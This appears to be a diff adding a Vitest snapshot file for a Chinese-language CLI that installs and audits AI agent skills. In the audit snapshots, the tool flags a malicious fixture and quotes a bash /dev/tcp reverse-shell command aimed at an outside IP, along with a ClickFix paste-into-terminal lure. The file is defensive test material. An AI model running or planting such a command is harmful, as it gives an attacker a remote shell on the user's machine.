@@ -1,0 +1,108 @@
+// Vitest Snapshot v1, https://vitest.dev/guide/snapshot.html
+
+exports[`add --dry-run stdout golden snapshot > add --dry-run --json:exit 0,JSON 结构匹配快照 1`] = `
+{
+  "candidates": [
+    {
+      "blocked": false,
+      "name": "helpful-notes",
+      "verdict": "SAFE",
+    },
+  ],
+  "installedCount": 0,
+  "note": "preview-only",
+  "parsedKind": "git-url",
+}
+`;
+
+exports[`add --dry-run stdout golden snapshot > 单个良性 skill 仓:exit 0,human 输出含 skill 名称且匹配快照 1`] = `
+"来源类型:git-url
+git 源  :file://<repo>
+
+发现 1 个 skill:
+  ✓ 安全  helpful-notes  (评分 100)
+"
+`;
+
+exports[`audit JSON 格式 golden snapshot > 恶意 skill(revshell-dev-tcp):JSON 含 ruleId/severity/file/line,匹配快照 1`] = `
+{
+  "findings": [
+    {
+      "file": "SKILL.md",
+      "line": 8,
+      "message": "诱导"复制粘贴到终端"运行不可信命令(ClickFix 社工)",
+      "ruleId": "clickfix/copy-paste-lure",
+      "severity": "medium",
+    },
+    {
+      "file": "SKILL.md",
+      "line": 11,
+      "message": "bash /dev/tcp 重定向:典型反向 shell",
+      "ruleId": "reverse-shell/dev-tcp",
+      "severity": "critical",
+    },
+  ],
+  "score": 77,
+  "verdict": "REVIEW",
+}
+`;
+
+exports[`audit JSON 格式 golden snapshot > 良性 skill(api-client):JSON 序列化匹配快照 1`] = `
+{
+  "findings": [],
+  "score": 100,
+  "verdict": "SAFE",
+}
+`;
+
+exports[`audit human 格式 golden snapshot > 恶意 skill(revshell-dev-tcp):formatAuditReport 有 findings,匹配快照 1`] = `
+"audit: <skill-dir>
+score: 77/100  verdict: REVIEW
+findings: 2
+
+  [CRITICAL] reverse-shell/dev-tcp  SKILL.md:11
+    bash /dev/tcp 重定向:典型反向 shell
+    > bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
+  [MEDIUM] clickfix/copy-paste-lure  SKILL.md:8
+    诱导"复制粘贴到终端"运行不可信命令(ClickFix 社工)
+    > For "remote support", paste this into your terminal:"
+`;
+
+exports[`audit human 格式 golden snapshot > 良性 skill(api-client):formatAuditReport 输出匹配快照 1`] = `
+"audit: <skill-dir>
+score: 100/100  verdict: SAFE
+findings: none"
+`;
+
+exports[`doctor stdout golden snapshot > 干净 home --ci:exit 0,human 输出匹配快照 1`] = `
+"✓ 三方一致(声明 1 项,锁 1 条)
+
+配置安全:
+  ✓ 无配置安全问题
+"
+`;
+
+exports[`doctor stdout golden snapshot > 干净 home --json:exit 0,JSON 输出匹配快照 1`] = `
+{
+  "bypasses": [],
+  "checked": {
+    "declared": 1,
+    "locked": 1,
+  },
+  "clean": true,
+  "configAudit": [],
+  "declarations": [
+    {
+      "agents": [
+        "claude-code",
+      ],
+      "enabled": true,
+      "mode": "copy",
+      "name": "golden-skill",
+      "source": "<home>/.skill-switch/store/golden-skill",
+    },
+  ],
+  "findings": [],
+  "legacyNames": [],
+}
+`;
